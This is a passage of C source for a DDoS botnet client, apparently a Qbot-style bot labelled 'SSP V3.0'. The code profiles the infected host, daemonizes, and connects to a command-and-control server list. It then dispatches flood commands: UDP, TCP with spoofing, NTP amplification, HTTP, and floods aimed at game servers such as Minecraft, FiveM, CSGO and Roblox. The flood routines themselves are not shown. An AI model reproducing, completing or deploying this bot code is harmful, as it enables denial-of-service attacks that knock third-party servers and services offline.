    return "MIPS";
    #elif defined(__LITTLE_ENDIAN__) || defined(_MIPSEL) || defined(__MIPSEL) || defined(__MIPSEL__)
    return "MIPSEL";
    #elif defined(__sh__) || defined(__sh1__) || defined(__sh2__) || defined(__sh3__) || defined(__SH3__) || defined(__SH4__) || defined(__SH5__)
    return "SH4";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(_M_PPC) || defined(_ARCH_PPC) || defined(_ARCH_PPC64) || defined(__ppc)
    return "PPC";
    #elif defined(__sparc__) || defined(__sparc) 
    return "SPARC";
    #elif defined(__m68k__) || defined(__MC68K__)
    return "M68k";
    #else
    return "Unknown";
    #endif
}
char *defopsys() {
    #if defined(__gnu_linux__) || defined(__linux__) || defined(linux) || defined(__linux)
    return "Linux";
    #elif defined(__WINDOWS__)
    return "Windows";
    #elif defined(__gnu_linux__) || defined(__linux__) || defined(linux) || defined(__linux) || defined(__ANDROID__)
    return "Android"
	else
    return "Unknown";
    #endif
}	
char *defpkgs()
{
        if(access("/usr/bin/apt-get", F_OK) != -1){
        return "Ubuntu";
        }
        if(access("/usr/lib/portage", F_OK) != -1){
        return "Gentoo";
        }
        if(access("/usr/bin/yum", F_OK) != -1){
        return "CentOS";
        }
		if(access("/usr/share/YaST2", F_OK) != -1){
        return "OpenSUSE";
        }
		if(access("/usr/local/etc/pkg", F_OK) != -1){
		return "FreeBSD";
		}
		if(access("/etc/dropbear/", F_OK) != -1){
        return "Dropbear";
        }
        if(access("/etc/opkg", F_OK) != -1){
        return "OpenWRT";
        }
		else {
        return "Unknown Distro";
        }
}
void cncinput(int argc, unsigned char * argv[]) 
{

////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////
//   /$$$$$$   /$$$$$$  /$$      /$$ /$$      /$$  /$$$$$$  /$$   /$$ /$$$$$$$   /$$$$$$  //
//  /$$__  $$ /$$__  $$| $$$    /$$$| $$$    /$$$ /$$__  $$| $$$ | $$| $$__  $$ /$$__  $$ //
// | $$  \__/| $$  \ $$| $$$$  /$$$$| $$$$  /$$$$| $$  \ $$| $$$$| $$| $$  \ $$| $$  \__/ //
// | $$      | $$  | $$| $$ $$/$$ $$| $$ $$/$$ $$| $$$$$$$$| $$ $$ $$| $$  | $$|  $$$$$$  //
// | $$      | $$  | $$| $$  $$$| $$| $$  $$$| $$| $$__  $$| $$  $$$$| $$  | $$ \____  $$ //
// | $$    $$| $$  | $$| $$\  $ | $$| $$\  $ | $$| $$  | $$| $$\  $$$| $$  | $$ /$$  \ $$ //
// |  $$$$$$/|  $$$$$$/| $$ \/  | $$| $$ \/  | $$| $$  | $$| $$ \  $$| $$$$$$$/|  $$$$$$/ //
//  \______/  \______/ |__/     |__/|__/     |__/|__/  |__/|__/  \__/|_______/  \______/  //
////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////

        if(!strcmp(argv[0], "UDP"))
        {
                unsigned char * ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);
                int packetsize = atoi(argv[5]);
                int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
                if (strstr(ip, ",") != NULL) 
                {
                        unsigned char * hi = strtok(ip, ",");
                        while (hi != NULL) 
                        {
                                if (!listFork()) {
                                sendUDP(hi, port, time, spoofed, packetsize, pollinterval);
                                _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } 
                else 
                {
                        if (!listFork()) 
                        {
                                sendUDP(ip, port, time, spoofed, packetsize, pollinterval);
                                _exit(0);
                        }
                }
                return;
        }

        if(!strcmp(argv[0], "NTP-AMP"))
        {
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);

                if (strstr(ip, ",") != NULL) 
                {
                        unsigned char * hi = strtok(ip, ",");
                        while (hi != NULL) 
                        {
                                if (!listFork()) {
                                sendNTPAMP(hi, port, time);
                                _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } 
                else 
                {
                        if (!listFork()) 
                        {
                                sendNTPAMP(ip, port, time);
                                _exit(0);
                        }
                }
                return;
        }

        if(!strcmp(argv[0], "MINECRAFT"))
        {
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);

                if (strstr(ip, ",") != NULL) 
                {
                        unsigned char * hi = strtok(ip, ",");
                        while (hi != NULL) 
                        {
                                if (!listFork()) {
                                sendMinecraft(hi, port, time);
                                _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } 
                else 
                {
                        if (!listFork()) 
                        {
                                sendMinecraft(ip, port, time);
                                _exit(0);
                        }
                }
                return;
        }

        if(!strcmp(argv[0], "FIVEM"))
        {
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);

                if (strstr(ip, ",") != NULL) 
                {
                        unsigned char * hi = strtok(ip, ",");
                        while (hi != NULL) 
                        {
                                if (!listFork()) {
                                sendFiveM(hi, port, time);
                                _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } 
                else 
                {
                        if (!listFork()) 
                        {
                                sendFiveM(ip, port, time);
                                _exit(0);
                        }
                }
                return;
        }

        if(!strcmp(argv[0], "OVH-GAME"))
        {
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);

                if (strstr(ip, ",") != NULL) 
                {
                        unsigned char * hi = strtok(ip, ",");
                        while (hi != NULL) 
                        {
                                if (!listFork()) {
                                sendOVH(hi, port, time);
                                _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } 
                else 
                {
                        if (!listFork()) 
                        {
                                sendOVH(ip, port, time);
                                _exit(0);
                        }
                }
                return;
        }

        if(!strcmp(argv[0], "TCP"))
        {
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);
                unsigned char *flags = argv[5];

                int psize = argc > 6 ? atoi(argv[6]) : 0;
                int pollinterval = argc == 8 ? atoi(argv[7]) : 10;

                if (strstr(ip, ",") != NULL) 
                {
                        unsigned char * hi = strtok(ip, ",");
                        while (hi != NULL) 
                        {
                                if (!listFork()) {
                                sendTCP(hi, port, time, spoofed, flags, psize, pollinterval);
                                _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } 
                else 
                {
                        if (!listFork()) 
                        {
                                sendTCP(ip, port, time, spoofed, flags, psize, pollinterval);
                                _exit(0);
                        }
                }
                return;
        }

        if(!strcmp(argv[0], "STD"))
        {
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);

                if (strstr(ip, ",") != NULL) 
                {
                        unsigned char * hi = strtok(ip, ",");
                        while (hi != NULL) 
                        {
                                if (!listFork()) {
                                sendSTD(hi, port, time);
                                _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } 
                else 
                {
                        if (!listFork()) 
                        {
                                sendSTD(ip, port, time);
                                _exit(0);
                        }
                }
                return;
        }

        if(!strcmp(argv[0], "CSGO"))
        {
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);

                if (strstr(ip, ",") != NULL) 
                {
                        unsigned char * hi = strtok(ip, ",");
                        while (hi != NULL) 
                        {
                                if (!listFork()) {
                                sendCSGO(hi, port, time);
                                _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } 
                else 
                {
                        if (!listFork()) 
                        {
                                sendCSGO(ip, port, time);
                                _exit(0);
                        }
                }
                return;
        }

        if(!strcmp(argv[0], "ROBLOX"))
        {
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);

                if (strstr(ip, ",") != NULL) 
                {
                        unsigned char * hi = strtok(ip, ",");
                        while (hi != NULL) 
                        {
                                if (!listFork()) {
                                sendROBLOX(hi, port, time);
                                _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } 
                else 
                {
                        if (!listFork()) 
                        {
                                sendROBLOX(ip, port, time);
                                _exit(0);
                        }
                }
                return;
        }
        
        if(!strcmp(argv[0], "ZAP"))
        {
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);

                if (strstr(ip, ",") != NULL) 
                {
                        unsigned char * hi = strtok(ip, ",");
                        while (hi != NULL) 
                        {
                                if (!listFork()) {
                                sendZAP(hi, port, time);
                                _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } 
                else 
                {
                        if (!listFork()) 
                        {
                                sendZAP(ip, port, time);
                                _exit(0);
                        }
                }
                return;
        }

        if(!strcmp(argv[0], "HTTP"))
        {
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);

                if (strstr(ip, ",") != NULL) 
                {
                        unsigned char * hi = strtok(ip, ",");
                        while (hi != NULL) 
                        {
                                if (!listFork()) {
                                sendHTTP(hi, port, time);
                                _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } 
                else 
                {
                        if (!listFork()) 
                        {
                                sendHTTP(ip, port, time);
                                _exit(0);
                        }
                }
                return;
        }

        if(!strcmp(argv[0], "OVH-HTTP"))
        {
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);

                if (strstr(ip, ",") != NULL) 
                {
                        unsigned char * hi = strtok(ip, ",");
                        while (hi != NULL) 
                        {
                                if (!listFork()) {
                                sendOVHL7(hi, port, time, 250);
                                _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } 
                else 
                {
                        if (!listFork()) 
                        {
                                sendOVHL7(ip, port, time, 250);
                                _exit(0);
                        }
                }
                return;
        } 

        if(!strcmp(argv[0], "HEX"))
        {
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int packetsize = atoi(argv[4]);

                if (strstr(ip, ",") != NULL) 
                {
                        unsigned char * hi = strtok(ip, ",");
                        while (hi != NULL) 
                        {
                                if (!listFork()) {
                                sendHEX(hi, port, time, packetsize);
                                _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } 
                else 
                {
                        if (!listFork()) 
                        {
                                sendHEX(ip, port, time, packetsize);
                                _exit(0);
                        }
                }
                return;
        }

        if(!strcmp(argv[0], "STOP"))
        {
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++) 
                {
                        if (pids[i] != 0 && pids[i] != getpid()) 
                        {
                                kill(pids[i], 9);
                                killed++;
                        }
                }
                if(killed > 0)
                {     
                } 
                else 
                {
                }
        }
}
int initConnection()
{
        unsigned char server[512];
        memset(server, 0, 512);
        if(SSPsock) { close(SSPsock); SSPsock = 0; }
        if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
        else currentServer++;

        strcpy(server, SSPserver[currentServer]);
        int port = 6982;
        if(strchr(server, ':') != NULL)
        {
                port = atoi(strchr(server, ':') + 1);
                *((unsigned char *)(strchr(server, ':'))) = 0x0;
        }

        SSPsock = socket(AF_INET, SOCK_STREAM, 0);

        if(!connectTimeout(SSPsock, server, port, 30)) return 1;

        return 0;
}

int main(int argc, unsigned char *argv[])
{
        if(SERVER_LIST_SIZE <= 0) return 0;

        srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        getOurIP();
        pid_t pid1;
        pid_t pid2;
        int status;

        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        exit(0);
                        } else if (!pid2) {
                        } else {
                        }
        } else {
        }
        setsid();
        chdir("/");
        signal(SIGPIPE, SIG_IGN);

        while(1)
        {
                if(initConnection()) { sleep(5); continue; }
                sockprintf(SSPsock, "\x1b[1;35mSSP\x1b[1;37m[\x1b[1;35mV3.0\x1b[1;37m]\x1b[1;35m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\x1b[1;35m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\x1b[1;35m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\x1b[1;35m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]", inet_ntoa(ourIP), defarchs(), defopsys(), defpkgs());
                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(SSPsock, commBuf, 4096)) != -1)
                {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }

                        commBuf[got] = 0x00;

                        trim(commBuf);
                        
                        unsigned char *message = commBuf;

                        if(*message == '!')
                        {
                                unsigned char *nickMask = message + 1;
                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = message + 1;

                                message = message + strlen(nickMask) + 2;
                                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

                                unsigned char *command = message;
                                while(*message != ' ' && *message != 0x00) message++;
                                *message = 0x00;
                                message++;

                                unsigned char *tmpcommand = command;
                                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }

                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");
                                params[0] = command;

                                while(pch)
                                {
                                        if(*pch != '\n')
                                        {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }

                                cncinput(paramsCount, params);

                                if(paramsCount > 1)
                                {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++)
                                        {
                                                free(params[q]);
                                        }
                                }
                        }
                }
        }

        return 0;
}
